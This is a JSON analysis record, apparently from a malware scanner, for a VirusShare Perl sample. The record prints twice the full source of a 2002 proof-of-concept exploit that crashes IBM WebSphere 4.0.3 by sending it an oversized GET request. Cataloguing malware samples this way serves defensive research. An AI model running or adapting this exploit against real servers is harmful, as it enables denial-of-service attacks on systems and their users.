@@ -1,0 +1,60 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Windows": "May enumerate application windows",
+            "system": "May run an executable file or a system command on a Mac"
+        },
+        "macro": "#!/usr/bin/perl -w\n# Proof of concept code\n# IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: Knight420\n# Released: 19th Sep 2002 : bugtraq id 5749\n#\n# Gr33ts:[omega] [lkm] [sorbo]\n#\n#\nuse IO::Socket;\nif ($#ARGV<0)\n{\nprint \"\\nIBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: \nKnight420\";\nprint \"\\n\\n Usage: perl sphere.pl ip\\n\\n\";\nexit;\n}\n\n$a = A;\n$dos = $a x 31337;\n$fry = (\"GET /$dos.jsp HTTP/1.1\\n Host: 127.0.0.1\\n\\n\");\n$connect = IO::Socket::INET ->new (Proto=>\"tcp\", PeerAddr=> \"$ARGV[0]\", \nPeerPort=>\"80\"); unless ($connect) { die \"SERVER IS DOWN $ARGV[0]\" }\nsystem('clear ');\nprintf \"IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: \nknight420\";\nprintf \"\\n*** [1] Server is up...\";\nprintf \"\\n*** [2] Sending our elite code...\";\nprint $connect \"$fry\";\nprintf \"\\n*** [3] Server should now be crashed\\n\\n\";\nclose($connect);\n\n"
+    },
+    "filename": "VirusShare_3c7aacf9698a10ab71781ea6ced694ef",
+    "filesize": 861,
+    "filetype": "Perl script text executable",
+    "hashes": {
+        "md5": "3c7aacf9698a10ab71781ea6ced694ef",
+        "sha1": "362421eab209b6546218661a3ac0ed29179851d3",
+        "sha256": "bf898618c3bd0a71812b1c20d114644090c17ebea06aeb8f02933b56c120c1cf"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/usr/bin/perl -w",
+            "# Proof of concept code",
+            "# IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: Knight420",
+            "# Released: 19th Sep 2002 : bugtraq id 5749",
+            "# Gr33ts:[omega] [lkm] [sorbo]",
+            "use IO::Socket;",
+            "if ($#ARGV<0)",
+            "print \"\\nIBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: ",
+            "Knight420\";",
+            "print \"\\n\\n Usage: perl sphere.pl ip\\n\\n\";",
+            "exit;",
+            "$a = A;",
+            "$dos = $a x 31337;",
+            "$fry = (\"GET /$dos.jsp HTTP/1.1\\n Host: 127.0.0.1\\n\\n\");",
+            "$connect = IO::Socket::INET ->new (Proto=>\"tcp\", PeerAddr=> \"$ARGV[0]\", ",
+            "PeerPort=>\"80\"); unless ($connect) { die \"SERVER IS DOWN $ARGV[0]\" }",
+            "system('clear ');",
+            "printf \"IBM Websphere 4.0.3 for Windows 2000 Server Remote D0S by: ",
+            "knight420\";",
+            "printf \"\\n*** [1] Server is up...\";",
+            "printf \"\\n*** [2] Sending our elite code...\";",
+            "print $connect \"$fry\";",
+            "printf \"\\n*** [3] Server should now be crashed\\n\\n\";",
+            "close($connect);"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [
+            "127.0.0.1"
+        ],
+        "url": []
+    },
+    "time": "0:00:00.266878",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
